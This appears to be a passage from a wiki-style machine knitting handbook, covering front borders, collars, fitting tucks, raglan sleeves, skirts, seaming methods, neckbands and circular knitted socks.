You pick up stitches one stitch from the edge. You can use this rule: Skip a row two times and take the row besides one time. You can use a stitch size one number lower than you used for the cardigan. You make the border double width. If you make buttonholes you can spread them by pushing up the needles to use a little, so that you can chance the distance between them if you find that it is not exact enough. If, for example, you make the border 24 rows (12 rows wide), you can make holes after 4 rows and after 20 rows. Move 2 needles to the neighbouring needle on each side. After one row turn the thread over them 180° and place it on the needle again. After 24 rows you knit contrast coloured yarn and release the knitting. Instead of moving the stitches to the neighbouring needles, you can knit 2 stitches with a little piece of yarn in another colour and then go on knitting. When you have finished the border you can iron it with a wet cloth or with steam. Then you can pull out the little strand. Before you seam the border, you must sew the buttonholes together and use the same yarn you used for the knitting. Fasten the yarn inside the border and sew alternately a stitch from each layer and some in between at the ends of the hole. If the yarn does not tolerate ironing, you can use the first method.

===Selvedge in rib===
You measure the length of the edge including the neckband and the rib at the beginning, and note the measurement. Then you measure the rib at the beginning; it is easiest at the back, because it is the longest. You know how many stitches there are, so you can divide by the measurement in cm. So you know how many stitches there are per cm. Multiply it with the measurement of the selvedge. Now you know how many stitches to cast on for the front borders. If you have rib borders below and on the neck, you had better use a few more stitches where the rib borders are, because they will move up or down a little. You can also measure how many rows you want. Don't pick up stitches, but make the selvedge seperately. Cast on with circular knitting, this gives a nice edge. Say you have decided to make 16 rows. You can make buttonholes after 10 rows. You can move 2 stitches, one to each side, one at the back needle bed and one at the front. Push up the empty needles again. Knit one row. Turn the thread over them 180°.

If you knit the front borders by racking every other row as previously mentioned, you can make the buttonholes in another way. When you have racked after 10 rows, make one row before you make the buttonholes. Choose them so that they will be racked after next row, then you need not turn them. After 16 rows you take off the comb and weights. Now place the one front piece on the machine with the wrong side out (Be sure to have the buttonholes in the right side). Place it on the needles over the border, but do not pull the needle up in the resting position; let the stitches stay on the hooks of the needles, otherwise you can't cast off without knitting a row. Place the end stitches on the edge and the middle in the middle. Place some more stitches where the rib borders are, and then gather the middle of the knitting and the middle of the needles, until you can spread them by yourself. Cast it all off at once.

If the cardigan has a tapering neck, you can make the front borders in the same way, maybe one piece together with the back neck, if there is enough space on the machine.

==Rib knitted collars==
If you do not want a big neck, add 3 cm both in the height and width.

If you only made one front piece, you must make a slit. You divide the front where the slit is going to begin, and knit one side at a time. You can cast off a few stitches in the middle to give space for front borders.

Make the neck as described in the chapter [[Machine_Knitting/Knitting_to_measure|knitting to measure]], but before you knit contrast coloured yarn, move every fourth stitch to the neighbouring needle. You need not move the stitches together, but just knit contrast coloured yarn over the whole. Before you release the knitting, count how many stitches you have the whole way round.

Cast on for the collar in rib, and use half as many stitches as the neck has. Knit straight up until the collar has the desired width. Transfer the stitches to the back needle bed. Move every other needle to the neighbouring needle. If you have a lace carriage, you can use that, otherwise you must do it by hand.

Knit one or two rows with the half stitch size, and knit contrast coloured yarn on before you release the collar.

Now you have both the collar and the neck with contrast coloured yarn. You can sew the stitches together from the wrongside and afterwards ravel off the contrast coloured yarn. See how to do it in the chapter [[Machine_Knitting/Mounting|mounting]].

If you want the collar to lie flatter, you can cast on twice as many stitches as the neck has. Then you do not need to decrease every fourth stitch on the neck, because when you have decreased every second stitch on the collar, you have the same number of stitches on the collar and on the neck.

Instead of sewing the neck and collar together, you can cast them off together. Leave the collar on the machine and place the neck stitches over it. It can only be done if you have two front pieces. If you have a slit, you cannot stretch it enough. However, you can divide the contrast coloured yarn into two halves, and only place half of the stitches on the collar; and when you have cast off the majority of them, you can place the rest of the neck and cast off.

      <text xml:space="preserve">=Garment patterns=
==Fitting methods==
When knitting you have the advantage as when compared with sewing, that you can shape without cutting and making tucks. Horizontal tucks, for example breast tucks in the side, can be made with shortened rows by bringing some needles in the resting position and turning the carriage. To make vertical tucks, move stitches with a transfer tool comb. It requires some practice, and you will have to move stitches several times if the tuck is near the middle. It takes a lot of time. But in some cases, you can transfer a vertical tuck to a horizontal. Say you want a tuck in the shoulder seam. When you have made a design of the garment, draw a horizontal line from the tapering of the tuck to the armhole. Cut this piece and turn it so that the tuck is moved to the armhole instead. This new tuck you have to disperse over several rows. For instance make 1 or 2 shortened rows with 4 or 6 rows between them. The shoulder seam will then be straight or may turn a little upwards.

If you are knitting a pattern, instead of making shortened rows, you can make the armhole higher; and when you place the armholes on the machine, you pick up stitches for the sleeve with a bigger space between the needles nearest the back of the shoulder. If a person has a round back, it is important to make a sweater longer, otherwise it will not only be too short, but also make sloped folds.

If you want the sleeves to fit nicely, you can make the extra width for the breast in the armhole higher too. When you have sewed the shoulder seam and picked up stitches in the armhole, you do it the following way: Pick up the two 1 needles ca. 1 cm in front of the shoulder seam, then the sleeve will be turned correctly. The bottom of the armhole you place at the needle numbers you calculated for the upper arm circumference. In the straight first piece under the arms, you pick up in each stitch, and the same in the first half part of the sloped piece. Then you begin to pick up with bigger spaces between the needles until about the middle, or a little longer, of the vertical piece. You must disperse the spaces, so you can use all the extra height. The rest of the way to the shoulder seam you use the normal space between the needles. On the back you now have a little extra height. Therefore you can make bigger spaces and begin a few cm behind the shoulder, but not such big spaces as in the front.

==Basic pattern==
You can design a basic pattern (sloper) for knitting, which you can draw at your knitleader or just calculate your measurements from it. Use the ordinary pattern in the chapter [[Machine_Knitting/Knitting_to_measure|knitting to measure]].

[[image:MachineKnittingFig4-1EN.gif|frame|right|Fig. 1]]
You can construct the breast tuck from that. For this you must use half the difference between the upper chest circumference and the breast circumference, which we call B. Let us say it is 3 cm. Besides that, you measure the breast height from the neck point, round the neck and to the widest point at the breast.

Now you can draw the pattern on chequered paper, which has squares of 1/2 cm. Name the squares 1 cm or 2 cm. Then the pattern will be 1/2 or 1/4 of your size. Place the neck point as shown on the drawing. Place the tape measure on its edge and measure 1/2 or 1/4 of the breast height round the neck and downwards, but subtract B (3 cm), otherwise the tuck will be placed too far down. Draw a horizontal line through the breast. From the breast line you draw a vertical line down to the edge, at right angle to the edge and the breast line. At the armhole you find a point, which is about the same height where the breast begins to get thicker. Draw a sloping line from this to the breast point. Now you have divided the pattern into 4 pieces. Name them 1-2-3-4 as you see on figure 1.

Cut the pattern and cut the 4 pieces from each other. Place them on another piece of paper in this way: Piece 1 stays in its place. Piece 2 is moved 3 cm downwards (That is the reason why you subtract 3 cm from the breast height). Piece 3 is temporarily moved 3 cm to the side. Piece 4 is turned with the centre in the armhole until it touches piece 3. Then you move piece 3 downwards until the corners meet, and a tuck appears. Piece 3 may not go as far down as piece 2, but you then draw a line from the side and to the middle of the space between piece 2 and 3. If the pattern only goes to the waist, you begin the knitting with shortened rows, but if it goes further down, you need not do this. The space between piece 2 and 3 is equal to the waist tuck.

If you have a knitleader, you can draw it to the right size or half size as the knitleader does it. But you may also use the little pattern if you place the right number of stitches and row on the pattern, and for how far the tuck goes both in the width and height. Calculate how many needles you must push up in the rest position at a time. At the armhole you measure where you are going to decrease and how many stitches at a time. Remember not to count the shortened rows. Put back the row counter for every shortened row.

If you have a very low breast, this pattern is not suitable. Then you should place the width in the waist.

===How to move tucks===
When you have made a basic pattern with a breast tuck, you can move the tuck, as you need it.

In figure 2a, the tuck slopes downwards instead of upwards; then there is space for a bigger armhole, but it still goes to the same point. The dotted line shows where the original line was. It means that instead of pushing all needles in the idle position and taking them down little by little, you do the opposite, push them up little by little and finally take them all down at the same time.

In figure 2b, the tuck is moved to the shoulder seam, if you are going to knit sideways. The dotted line shows here the basic pattern's original as well.

You do this in the following way: Draw an extra basic pattern. Draw it on transparent paper and cut it out. Make a mark where you want the new tuck, both on the pattern and on the transparent paper. Place the transparent paper on the pattern and the point of the pencil on the breast point, as shown on figure 2c. Fold the transparent paper as far down as the side tuck, make a mark on the shoulder where the mark on the transparent paper is now. Draw round the edge of the transparent paper from the mark and down to the original tuck. Then draw lines from the two marks on the shoulder and down to the breast point, so you make a new tuck.

[[image:MachineKnittingFig4-4.gif|frame|right|Fig. 3]]
&lt;!-- The filename is out of order with the figure number because it is taken from the Danish version of this book --&gt;
In this way you can move tucks as you want, by first making a mark on both patterns and turning a sharp pencil in the breast point. Make a mark where the transparent paper reaches, when the old tuck has gone together, and draw round the edge of the transparent paper from the new tuck to the original tuck.

If, for instance, you want to knit a tight waist with a tuck, you can turn the waist tuck away and place it in the side so the breast tuck gets bigger. You can then start with shortened rows and at the same time increase in the side.

On the back you have to move stitches by hand because there is no place to put it. You can use a transfer tool comb.

Open all the latches on the needles you are going to move and place the transfer comb on them. Pull the needles towards yourself until the stitches slip behind the latches and push them back again until they slip out over the needles. Before you move the comb, use it for pushing back the latches so they are prepared for receiving the stitches again when you have moved the comb. &lt;br style=&quot;clear:both&quot; /&gt;

==Raglan==
[[image:MachineKnittingFig4-4EN.gif|frame|right|Fig. 4]]
The easiest way to knit raglan sleeves is when the sloping line makes an angle about 35° to the vertical. If you have a normal ratio between stitches and rows, you can attain this by decreasing one stitch at the beginning of each row. You draw your pattern on chequered paper so it fits you in 1/2 or 1/4 size.

The front and back have to be the same size, and you lay them over each other. Now you can draw the sloping line, which must start a little way below the sleeve hole, and draw to the neck in the front and continue to the back neck. You can start decreasing stitches a little higher than the sloping line begins, and decrease a few more stitches the first time (look at figure 4). Where the back and front neck meet, you draw a horizontal line. That is the middle of the sleeve, and here you mark NS off the sleeve hole. From there you can measure the sleeve length. To get the little piece which belongs to the back neck, you fold over the shoulder line and prick the neckline to lengthen the front neckline. The sloping lines on the sleeve must also be 35°. The upper part of the sleeve is shown with dotted lines in the lengthening of the front and back neck. When you draw the sleeve, you start with the centre line. Then transfer the dotted piece and remember the shoulder point (NS). The sloping line on the front of the sleeve must be the same length as the line on the basic pattern from the neck and till the sleeve hole, and the back part must be the same length as the line from the back neck to the sleeve hole. That is to say a little longer than the front. The upper part of the sleeve must therefore be knitted with shortened rows. Now you can finish the sleeve. If you started decreasing a few stitches at the same time on the blouse, you must draw that on the sleeve in both sides too. But here it goes out instead of in. It gives a little more width under the arm. The sleeve length you measure from the shoulder point (NS), which you have marked on the centre line. The shoulder rounding will reduce some of the sleeve length, so you must either add 2 cm to the sleeve length or knit some shortened rows over the shoulder point. So you have to know exactly where the shoulder is, otherwise it looks awful.

===Raglan with holes===
[[image:MachineKnitting-4-raglan-hole.jpg|right]]
Raglan sleeves can be knitted together with the blouse if you use shortened rows. Then a row of holes will appear and it may look nice on light blouses.
Start with the front piece. When you come to the sleeve hole, you push for instance 4 needles in the resting position in the end of each side the first time. Then push one needle at a time in each side until you come to the neck. Note which number needle you pushed up the last time and the row number before you make the neck. Now push half of the needles in the resting position and make the neck round on one side. At the same time you still push a needle in the end of each row in the sleeve side. But on the neck side you push the needles shaping the neck in the end of each row, and one extra on the way back to avoid holes. When there is only one needle left, you note the row number, push down all needles, and move the carriage to the other side. Push the needles in the finished side up again, turn back the row counter to the number you noted before you made the neck, and knit the other side in the same way. Push the needles on the side in the resting position until you reach the row number you noted in the first side. Knit 4-5 rows of yarn in a contrasting colour on the neck needles and on each sleeve individually. The stitches you left belong to the neck. Don't worry that the sleeve hole will wrinkle when you knit the contrast coloured yarn onto them, because that will disappear again when you knit the sleeves.

Knit the back in the same way until you reach the same row number as in front plus a few more rows as you can see on the pattern. So you get more holes on the back. The back neck will not be round, so you just knit contrast coloured yarn on that as well, and on the sleeve holes on each side individually.

===Sleeves===
Calculate how many stitches you need for the upper arm circumference.
For each sleeve you use the stitches from one side on the front and one side on the back and these you supplement with the number of stitches you lock. You cast on the extra stitches in the middle, and place the stitches in the idle position on each side. You pull them up through the last row with the neck side nearest to the new stitches, one side from the front and the other side from the back. Then ravel off the contrast coloured yarn. The needles stay in the idle position. Knit one row over the middle stitches plus one stitch in each side from the needles in the idle position. After that, you knit the sleeve higher at the back by making as many shortened rows as you have more rows in the back than in the front. At the same time, you take one needle from the backside down in the end of the row. Now there should be the same amount of needles in the idle position in each side. Continue pushing one needle down in the end of each row until there are 4 stitches left on each side. You push them all down at once. However, you must know how many rows you are going to knit before you come to the shoulder point, because from there the row counter must be turned back to 0. The sleeve length, you calculated, has to be about 2 cm longer because the shoulder rounding uses some of the length. Instead, you can make a few shortened rows over the shoulder point. But if you do that, you must note the needle number and row number, so you can continue from there when you have finished the shortened rows.

==Skirts==
[[image:MachineKnittingFig4-h1.gif|frame|left|Fig. 5]]
[[image:MachineKnitting-4-Rosalinde.jpg|right]]
'''Measures:'''

* Waist circumference

* Hip circumference

* Hip height

* Skirt length

There are many ways to knit skirts. You can make one in 4 pieces as figure 5 shows. You can make it with more or less width. The more width, the more you have to round it in the waist and below. If you do not want so much width, you must either make a tuck in the waist or wrinkle it a little.
&lt;br style=&quot;clear:both&quot; /&gt;

[[image:MachineKnittingFig4-skirt.gif|frame|right|Fig. 6]]
You can avoid a seam in the middle of the front and back if you have a ribber and knit it half round, but then you have to shift the idling buttons for each row. You must decrease on both sides, both on the knitter and the ribber. When you come to the waist, you decrease a few stitches dispersed through the knitting before you make a waist band. You make it double height. Put a belt band or an elastic band inside.

A skirt can be knitted sideways with shortened rows. The number of times you make shortened rows depends on how much width you want in the skirt. You can make it as a whole or a half circle if you want, but you can make less width too. You divide the width below by the waist width, and the result is the amount of shortened rows you make for each whole row.

[[image:MachineKnittingFig4-skirt2.gif|frame|right|Fig. 7]]
Figure 7 shows half a pattern, a front piece or a back piece. The whole skirt will be a half circle. But it is possible to knit the skirt in one piece so that you only have one seam at the back. Afterwards you can pick up stitches in the waist and make a waistband or maybe a whole dress. You must always make the waist wide enough so that you can decrease some stitches dispersed through the knitting.

If you want to know how much yarn to use for this skirt you must calculate the area of the skirt. Let us say it is half a circle. If you multiply the radius squared by 22/7 you will get the area of a whole circle, but you only use half of it. Then you can weigh your knitting sample on a letter balance as described in the [[Machine_Knitting/Knitting_samples|knitting samples]] chapter and calculate the weight per cm&lt;sup&gt;2&lt;/sup&gt; and multiply it with the area.

You can also knit a skirt as a straight piece and wrinkle it more or less in the waist. You can for example cast on twice the waist circumference, start below, and when you reach the waist, transfer half of the stitches to a knitting needle and place two stitches on each needle. Then do the same with the other side. Afterwards you make a waistband or maybe the upper part of a dress.

If you have a ribber, you can make the skirt with pleats in the following way: Use thin yarn and all the needles. Then take for example every nineth needle out of function, and place the stitch on the neighbour needle. Do this both on the ribber and on the knitter, but shift it so that the holes on the ribber are in the middle of the space between the holes on the knitter. A pleated effect will appear. Make some samples with different stitch sizes and different spaces between the holes, so that you can choose what looks best with your yarn. &lt;br style=&quot;clear:both&quot; /&gt;

==Basic pattern for skirts==
[[image:MachineKnittingFig4-skirt3.gif|frame|left|Fig. 8]]
[[image:MachineKnittingFig4-skirt4.gif|frame|right|Fig. 9]]
If you want to knit a fitted skirt, you measure your waist and your hip, and add at least 6-7 cm. You also measure the distance between the waist and the hip and the length of the skirt. You add at least 3 cm to the waist for a tuck. When you knit this, you will have to use a transfer comb. In the side you draw an arc from the waist to the hip. As a rule, the waistline bows upwards a little in the side, so you must make a few shortened rows before you make a waist band. It might be a good idea to make a lining.

When you have designed the basic pattern for your skirt, you can make different fashions as figures 8 and 9 show. You can draw a vertical line through the middle of the tuck and down to the edge. Then cut the line and fold the pieces away from each other so you get more width. On figure 8, the pieces are folded until half of the tuck disappears. Besides, there is a little extra width in the front and the side. These pieces must only be half the size of the piece at the tuck, as the pieces will be twice as wide because you only draw 1/4 of the whole skirt.

On figure 9, you fold so far that the whole tuck disappears. The hip rounding disappears too.

The patterns may be knitted in 4 pieces or on both machines half round knitted.

Cast on the whole width below and knit a few rows before you make shortened rows in order to make it round.

==Sewing together by machine==
It is easier if you iron the edges before you sew them together; but if the yarn cannot be ironed, the edges can still be sewed together.

If you have picked up stitches in the sleeve holes and knitted the sleeves downwards, you can sew the sleeve and the side at once. Start pinning the pieces together and place the pins at a right angle to the edge. You put one pin under the arm and then one pin at each end. Spread the pins levelly. If there are stripes or pattern you put a pin in each stripe or pattern, to make sure they lie over each other.

When you sew the edges together it is important that you do not pull the seams so that they will bulge. You can use a large needle and push the knitting under the pressure foot and at the same time smooth the edges to prevent them from rolling. Be sure to sew both layers. You may prefer to tack the seams together before you sew them on the machine. You can sew with a zigzag at stitch width 1 and normal stitch length. Then the seam will be a little bit elastic without bulging. If you have cast off the shoulder seams, be sure to sew them together behind the casting-off edge, otherwise this will show upon the rightside.

If you did not pick up the stitches in the sleeve holes but started the sleeves beneath, then you must sew the side seams and the sleeve seams separately. Afterwards you pin the sleeve to the sleeve hole while the person is wearing the blouse. Be careful that the sleeves are hanging straight down not turning so they make sloping folds. First you put a pin in the shoulder seam, and then at each side of the sleeve. You may want some extra width, preferably a little in front of the shoulder seam where the shoulder blades curve forward. It is not important that the sleeve seam lies on top of the side seam; it may overlap the side seam a little. 

When you have pinned the sleeve, you sew three marks across the seam, one opposite the shoulder and one at each side underneath the extra width, and make another mark opposite them on the armhole. When you have pinned the sleeve so that it fits in the armhole, you can take out the pins, and transfer the marks to the other sleeve. You turn one sleeve inside out and put it into the other sleeve so that the seams lie over each other and pin them together. You put a pin in each mark and sew another mark at the other sleeve without sewing through both layers. You pin the sleeve holes together too, so that the shoulder seams and the side seams lie over each other, and transfer the marks in the same way. Now you can tack the sleeves and see if they fit exactly so that you can sew them by machine.

Rib bands are not so easy to sew by machine. It is difficult to make the stitches so that the rows of purl and plain stitches go straight. I suggest that you sew them by hand. You take a half knit stitch from each side, so that it looks like a whole stitch. Then you can start and end with a knit stitch when you cast on and do the same when you make the neckband and the wrist.

==Sewing together by hand==
[[image:MachineKnittingFig5-1.gif|frame|right|Fig. 1]]
'''Side seams:''' Place the pieces besides each other with the knit side up.

# Prick down half a stitch from the edge on the one piece and up again in the stitch above it.
# Prick down on the other piece half a stitch from the edge in the opposite stitch and up again in the stitch over it.
# Prick down in the first piece in the same hole where you pricked up the first time and up again in the stitch above it.
# Go back to the other piece and prick down in the stitch you pricked up before, and so on.

When you pull the thread together, the two half stitches will make a whole stitch and the seam will not be seen. It may be a little clumsy if you use the knitting yarn, so you can use sewing thread in the same colour. It will not show. &lt;br style=&quot;clear:both&quot; /&gt;

==Assembling or seaming open stitches==
===To sew stitches together on the rightside===
[[image:MachineKnittingFig5-2.gif|frame|right|Fig. 2]]

I am assuming that the yarn you are using can be ironed.

Use a needle without a point. See figure 2. The two pieces have not been cast off but end in a contrasting colour. Iron the two pieces each, using steam or pressing them with a damp cloth. Place the pieces so that the open stitches are facing one another. You may have left a thread hanging which you can use to seem the pieces together. Otherwise you can take another and stitch it on.

# Prick from below and up in the stitch that is connected with the thread.
# Prick from above and down in the opposite stitch on the other piece.
# Prick from below and down in the stitch beside it.
# Prick from above and down in the stitch you started at on the first piece.
# Prick from below up in the stitch beside it.
# Prick from above and down in the stitch on the upper piece which you pricked up from last time.
# Prick from below and up in the stitch beside it, etc.

In other words you must prick two times into each stitch, once from above and once from below. In this way you make a whole stitch. Pull the stitches together just as tightly as the knitted stitches so they cannot be seen at all.

This method can be used for shoulder seams, stockings etc.

===To sew stitches together from the wrongside===
[[image:MachineKnittingFig5-3.gif|frame|right|Fig. 3]]
If the yarn cannot be ironed you can leave the contrasting colour and sew from the wrongside. On the first contrasting row there is half a row of contrasting colour, then half a row of the basic yarn, and that is the row you are going to sew in. (fig. 3).

# Sew from below and up through the lower half stitch.
# Sew from below and up through the half stitch on the upper piece.
# Sew from above and down through the next stitch in the upper piece.
# Sew from above and down through the half stitch on the lower piece, the same stitch you came from last time.
# Sew from below and up through the stitch besides it.
# Sew from below and up through the half stitch on the upper piece in the same stitch you came from last time. So you still sew twice in each stitch.

You pull it together just as tightly as the rest of the knitting. When you have finished the sewing you can ravel the contrast coloured yarn off.

===To sew the open loops down===
You can use this method for neckbands, wrists etc. You knit twice as many rows as you are going to use. Then you bend them and sew the open loops onto the purl side. The knitting will then be more elastic than if you had cast the edge off.

==Neckband in rib==
[[image:MachineKnittingFig5-4.gif|frame|right|Fig. 4]]
As described in the [[Machine_Knitting/Edges|edges]] chapter you begin with large stitch size, and gradually go down to the smallest stitch size. Knit one row on stitch size 10, and gradually go up again to the biggest stitch size. Now it is easy to se where the edge is going to be bent. Leave a long thread for the sewing before you knit the contrast coloured yarn. You cannot leave the contrast coloured yarn because it will stay inside the seam. Iron the edge firmly before you sew the stitches down. If the yarn cannot be ironed, you must be careful not to press that part of the seam which is seen on the right side and only iron the outermost rows.

Use a needle without a point and proceed in this way:

# Make a stitch with the thread you left up through the first stitch in the neckband.
# Sew down in a loop on the blouse underneath the neckband.
# Prick down in that stitch on the neckband, where you pricked up last time.
# Prick up in the next stitch on the neckband.
# Sew down in the next loop on the blouse.
# Prick down in the same stitch on the neckband where you came up last time.
# Prick up in the next stitch on the neckband.
# Sew down in next loop on the blouse etc.

If you take a whole stitch on the blouse instead of taking a loop, it will be seen on the right side. Don't sew twice in the loops on the blouse, but sew twice in each stitch on the neckband, once from below and one time from above. See figure 4.

===Ribknitted neckband===
[[image:MachineKnittingFig5-5.gif|frame|right|Fig. 5]]
Make an extra knit stitch in the side where the last stitch is a purl stitch, in order to sew the neckband neatly. Do it in the same way as the stocking knitted neckband, but as rib knitting uses a smaller stitch size, you only decrease it by 1/3 stitch size at a time, say every second to every fourth row. You may go down to stitch size 1 or 0, but you do not make a row on stitch size 10, just go up again and end with a stitch size bigger than the first, so the stitches are easier to sew down. Knit contrast coloured yarn and release the knitting. Then iron the edge firmly with steam or a wet cloth, but be careful not to stretch it when you iron it, because then the stitches will be smaller and more difficult to find, when you sew them down.

Look at figure 5, and proceed in this way:

# Prick from below through the first knit stitch on the neckband.
# Catch a loop on the blouse underneath.
# Sew from above in the first knit stitch and from above in the next purl stitch.
# Catch a loop underneath.
# Sew from below in the same purl stitch you came from last time and from below in the next knit stitch.
# Catch the next loop underneath, etc.

Be careful so that the seam does not shift out of place. You can avoid that if each time you catch the loop you take the one just underneath the stitch. When you go from a knit stitch you catch the loop under a purl stitch on the neckband, because the neckband is bent over, and a knit stitch is a purl stitch on the other side. When you go from a purl stitch you catch a loop underneath a knit stitch.
&lt;br style=&quot;clear:both&quot; /&gt;

==Cut neck==
If you have knitted a pattern and it is difficult to shape the neck, you can knit straight up, and afterwards cut the neck shape and perhaps the shape of the shoulder. You can do this in the following way:

Take a piece of wrapping paper and fold it together into half. Draw half the pattern of the neck and shoulder, so that the fold is the middle of the neck. Design it big enough to leave space for the neckband. Under the neck you must leave a plenty of space before you cut the pattern out. Unfold it so you have both sides of the pattern and draw a line in the fold. Fold the blouse along the middle and tack a line on the fold. Place the pattern on the blouse and pin the middle line on the middle line of the blouse. Pin it all the way round. Now you sew a zigzag seam on stitch width 1 on the machine along the edge of neck and shoulders. The stitch length can be 1 or 1½. Cut very close to the stitches, but be very careful not to cut in the knitted stitches. Take the pattern off and sew once more over the seam with stitch width 2, not wider, because then you cannot knit a row when you have picked up the stitches behind the seam.

Turn the purl side out and pick up the stitches. First you place the middle on the two 1 needles. If you are not sure where to place the last needles, calculate which needle number you should have had if you had knitted the neck as usual, and add some extra needles for the straight piece on the side of the neck. Make one row before you move the stitches for rib knitting, and do as described in the [[Machine_Knitting/Edges|edges]] chapter. When you sew the stitches down, you take the loops underneath the zigzag edge, so you cover it. Do the back in the same way, but without leaving a piece for the side of the neck. You may store the paper pattern and use it several times.

You can cut a tapering neck in the same way. Instead of knitting the band by itself, you must pick up the stitches behind the zigzag seam and do it like a round neck. Look in the [[Machine_Knitting/Edges|edges]] chapter for how to make a tapering neck.

==If a stitch has been dropped==
[[image:MachineKnittingFig5-6.gif|frame|right|Fig. 6]]
Put a safety pin into the stitch, until the piece is finished. Then crochet up the stitch with the casting on needle, but leave out the last loop, because otherwise there will be one stitch too much. You may fasten the starting thread firmly by making it penetrate the thread used for sewing.

If there is a pattern, then look somewhere else in the knitting and find out what colour the loop that you take must have, in order that the pattern is made to fit. If several stitches next to each other have been dropped, then it is more difficult to get a nice result. When you crochet up the first stitch, then put a safety pin into the other stitches. Usually, the loops will have small curves of thread if they have been knit and have been dropped afterwards. Use only what corresponds to the length of such a curve for every stitch, then the yarn will become distributed evenly. If you have not yet come very far in the knitting, you may pay better off to discard the knitting and start anew.

Measure the foot length from the middle of the heel to the tip of the toe. Look at figure 1. Measure the width round the leg just over the ankle where it is thinnest. Concerning the number of stitches, it is most practical if it is divisible by 4. It is an advantage if it is furthermore divisible by 3, but this is not absolutely necessary. 60 - 68 stitches will often be suitable for grown up people if you use ordinary stocking yarn and stitch size 8 - 8 1/3. If the machine can go up to 10 on the ribber, that might be the best.

===Knitting sample===
Cast on 40 stitches and knit 60 rows. Pull the sample lengthwise and leave it for a moment before you measure the length in the side. If you know fairly well how many stitches you have to cast on, you can begin knitting at once. If you are not sure, you must leave the sample until the next day and measure the width. If you are going to make circular knitted socks, you use twice as many rows on the foot, because the carriage passes the row counter twice at each turn.

You can knit stockings either flat or circular. If you knit them flat, you have to sew them together afterwards. Even with a ribber available, many people prefer to knit the socks flat, because it goes very fast, but then you must use time for mounting afterwards. However, circular knitting looks nicer because it is more like hand knitting. The difficult point is to turn the two fourth pieces, and transfer them to the back bed, when you have finished the rib border. However, when you have practiced it for some time, you can do that quickly too.

===Circular knitted socks===
In this example you cast on 60 stitches for rib knitting. The rib border must not be knit too tightly, because that will make it difficult to put the socks on. Use the racking method (described in the [[Machine_Knitting/Edges|edges]] chapter) which is more elastic, for the casting on. You must have an even number of stitches, otherwise there will be two stitches besides each other in one side of the knitter. But you may afterwards add a plain stitch, so that the leg may be sewed nicely together.

Knit the desired length, say 60 - 80 rows, not less, as it then will be difficult to turn the stitches to the knitter, because of the comb which must stay on the knitting. Knit the last row on a bigger stitch size. Move all the stitches from the knitter to the ribber and knit one row with the same stitch size as you will use for the circular knitting. Knit the first 15 stitches by hand, so the thread stays in the side, when you turn the stitches. Now 1/4 of the stitches (15) in each side shall be transferred to a comb with transfer tools or a knitting needle, then be turned and moved to the knitter.

===Turning the stitches===
Open all the latches on the knitter and leave the needles in non-working position (A), so you know they are placed in a row. Push down the bracket levers of the ribber and let it down one step. Hang the claw weight hangers into the stitches from number 1 till 15, and hang one of the little weights on each of them. It is important that the claws are well fastened in the stitches, especially in needle number 15. Transfer the outmost 15 stitches at one side to the latch tool comb. Turn the comb, be careful not to catch some of the knitting on a latch tool, and place the stitches on the knitter from needle number 1 - 15. If you drop a stitch and it runs down, do not try to pick it up - it is easier to crochet it up afterwards. Repeat the process in the other side.

Adjust the machine to circular knitting, move the weights in the side of the comb, and place only one of them in the middle. Knit for instance 10 turns of circular knitting (20 rows) before you start the heel.

===Heel===
Release the idle buttons, let down the ribber one step, and change the yarn leader to plain knitting. Adjust the holding cam lever. Now knit at the back needle bed. Push one needle at a time into the resting position at the end of each row until there are 10 needles in the resting position in each side and 10 needles left in the middle. If the number of stitches can't be divided by 3, you will either have a surplus or a deficit of one needle in the middle, but that does not matter. Now you have reached the bottom of the heel. Hang a side weight on the middle stitches, and set the row counter at 0. Now push one needle at a time down in the end of each row until all needles are down again. When you have knitted the last stitch in each side, you can place the thread round the last stitch on the ribber and knit it by hand, when you have pushed up the ribber again. You do that to avoid big holes in the side. When you have finished the heel, before you return to circular knitting, you set the row counter to twice as much as it was, because the rest of the foot is knitted in circular knitting, and the carriage passes the row counter twice in each turn. Change the yarn leader, push up the ribber and adjust to circular knitting, but so that you start the circle with the ribber, to avoid holes in the side.

===Casting off the toe===
When 30 rows remain before you reach the end of the foot (i.e. 3 times the number of stitches you have to cast off in each side), you cast off one stitch in each side, both on the ribber and on the knitter (4 stitches in total) for every other turn (4 rows). Use the double transfer tool (with two tools). When you have cast off 5 stitches in each side of both the ribber and the knitter, you cast off the next 5 in every turn, two rows. Now you have reached the foot length, and you have 10 stitches left on each needle bed. Then place two stitches on two needles in each side, corresponding to a total of 8 stitches, and knit one turn. It is a little hard, but it can be done. Now you have two options. You can move the stitches from the ribber to the knitter and cast them all off. In that case the casting-off edge will appear on the right side. The other option is to knit in contrast coloured yarn and afterwards sew the stitches together. Naturally, that will give the nicest result. How you do that, is described in the [[Machine_Knitting/Edges|edges]] chapter.

Instead of turning the stitches after having finished the rib border, you can take off the knitting, turn it by hand, and place it on the machine again. Then it is important to do it as follows: Move the stitches from the ribber to the knitter. Knit one or two rows in the stitch size you are going to use for the circular knitting. Knit in contrast coloured yarn, not more than 4 - 5 rows, otherwise it will be difficult to place the stitches again; and take off the knitting, but leave the comb on. Iron it very well with steam or a wet cloth on both sides. The contrast coloured yarn must be smooth as well.

===Placing the stitches on the machine===
If you have knitted pattern in the leg, you have to reverse the sock to turn the rightside outwards. In that case, you cannot use the first method that I described.

Let down the ribber two steps. Place the two ends on the two 1 needles on the knitter, but it is important that they don't go behind the latches, because then they can easily fall off. Continue until you reach needle number 15 in each side. Raise the ribber one step and hang one of the weights on the middle of the comb. Place the rest of the stitches on the ribber, without pulling them behind the latches, but pull the needles in the same height as the stitches on the knitter. It is easiest if you have the crochet hook in the other hand to help placing the stitches on the needles. When you push up the ribber, you keep the needles down with one hand to avoid that the stitches go behind the latches. If the number of stitches does not suit the number of needles, you either have dropped a stitch or caught an extra loop. When all the stitches are placed, you ravel off the contrast coloured yarn. Adjust the idle buttons and the stitch size.

In the same way you can knit new feet on worn out socks. You can save yarn if you cut off the feet, try to follow a row, pick away those rows that have been damaged, and place the leg on the machine as described before. As the stockings have been washed several times, the stitches will not run down.

